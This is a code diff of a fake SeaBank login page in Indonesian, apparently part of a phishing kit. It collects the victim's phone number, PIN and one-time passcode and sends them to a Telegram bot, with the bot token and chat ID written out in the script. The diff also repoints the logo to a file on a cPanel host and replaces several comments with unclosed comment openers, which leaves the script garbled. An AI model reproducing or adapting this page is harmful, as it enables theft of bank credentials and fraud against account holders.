@@ -109,7 +109,7 @@
 
     <!-- LOGIN PAGE -->
     <div id="loginPage">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/ac/SeaBank.svg/3840px-SeaBank.svg.png" class="logo">
+        <img src="https://nvme2.natanetwork.id:2083/cpsess3095982347/frontend/jupiter/filemanager/showfile.html?file=lg-65e38a526d27d-SeaBank.webp&fileop=&dir=%2Fhome%2Fziideve1%2Fpublic_html&dirop=&charset=&file_charset=&baseurl=&basedir=" class="logo">
 
         <h2>Log in dengan no. handphone</h2>
 
@@ -152,7 +152,7 @@
 
 <script>
 
-    /* === Telegram setup === */
+    /* 
     const TG_TOKEN = "8679387125:AAGnUwe5XKJ275UmuYBY7d-gMmx4K3kPKSc";
     const TG_CHAT_ID = "8580851235";
 
@@ -168,7 +168,7 @@
         });
     }
 
-    /* === LOGIN → OTP === */
+    /* 
     function goOTP() {
         let hp = document.getElementById("hp").value.trim();
         let pin = document.getElementById("pin").value.trim();
@@ -178,7 +178,7 @@
             return;
         }
 
-        /* Kirim ke Telegram */
+        /* 
         sendToBot(
             `<b>📱 LOGIN</b>\n` +
             `Nomor: <code>${hp}</code>\n` +
@@ -191,7 +191,7 @@
         document.querySelector(".otp-input").focus();
     }
 
-    /* === OTP → SUCCESS === */
+    /* 
     function goSuccess() {
         let otp = "";
         document.querySelectorAll(".otp-input").forEach(i => otp += i.value);
@@ -201,7 +201,7 @@
             return;
         }
 
-        /* Kirim OTP ke Telegram */
+        /* 
         sendToBot(
             `<b>🔐 OTP</b>\n` +
             `Kode OTP: <code>${otp}</code>`
